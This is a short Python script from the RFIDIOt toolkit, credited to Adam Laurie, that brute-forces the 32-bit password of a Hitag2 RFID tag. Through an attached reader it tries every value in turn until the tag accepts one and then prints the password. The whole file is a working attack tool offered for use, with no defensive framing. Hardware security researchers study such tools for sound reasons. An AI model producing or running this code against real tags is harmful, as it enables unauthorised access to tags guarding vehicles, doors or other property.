#!/usr/bin/python3
#  hitag2brute.py - Brute Force hitag2 password
#
#  Adam Laurie <adam@algroup.co.uk>
#  http://rfidiot.org/
#
#  This code is copyright (c) Adam Laurie, 2008, All rights reserved.
#  For non-commercial use only, the following terms apply - for all other
#  uses, please contact the author:
#
#    This code is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This code is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#


import sys

# import os
# import time
import rfidiot

try:
    card = rfidiot.card
except Exception as _e:
    print("Couldn't open reader!")
    print(_e)
    sys.exit(True)

args = rfidiot.args

card.info("hitag2brute v0.1c")

pwd = 0x00

# start at specified PWD
if len(args) == 1:
    pwd = int(args[0], 16)

card.settagtype(card.ALL)

if card.select():
    print("Bruteforcing tag:", card.uid)
else:
    print("No tag found!")
    sys.exit(True)

while 42:
    PWD = "%08X" % pwd
    if card.h2login(PWD):
        print(f"Password is {PWD}")
        sys.exit(False)
    else:
        if not pwd % 16:
            print(PWD + "                        \r", end="")
    if not card.select():
        print("No tag found! Last try: {PWD}\r", end="")
    else:
        pwd = pwd + 1
    sys.stdout.flush()
    if pwd == 0xFFFFFFFF:
        sys.exit(True)

sys.exit(False)
